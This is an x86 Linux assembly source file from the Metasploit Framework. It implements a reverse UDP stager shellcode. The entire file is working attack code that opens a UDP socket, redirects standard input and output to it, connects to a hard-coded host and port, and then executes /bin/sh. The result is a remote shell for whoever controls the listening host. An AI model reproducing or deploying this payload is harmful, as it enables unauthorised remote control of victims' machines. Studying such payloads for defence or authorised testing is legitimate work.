;;
; 
;        Name: stager_sock_reverse_udp
;   Qualities: Can Have Nulls
;   Platforms: Linux
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision: 1450 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a Linux reverse UDP stager.
;
;        File descriptor in edi.
;
;;
BITS   32
GLOBAL _start

%define  ASSUME_REG_EDX 0
%include "generic.asm"

_start:
	xor  ebx, ebx

socket:
	push ebx
	push byte 0x2
	push byte 0x2
	inc  ebx
	push byte 0x66
	pop  eax
	mov  ecx, esp
	int  0x80
	xchg eax, ebx

dup:
	pop  ecx
dup_loop:
	mov  al, 0x3f
	int  0x80
	dec  ecx,
	jns  dup_loop

connect:
	pop  ebx
	pop  edx
	push dword 0x0100007f
	push word 0xbfbf
	push word bx
	mov  ecx, esp
	push byte 0x10
	push ecx
	push ebx
	mov  ecx, esp
	inc  ebx
	mov  al, 0x66
	int  0x80

execute:
	execve_binsh EXECUTE_DISABLE_READLINE
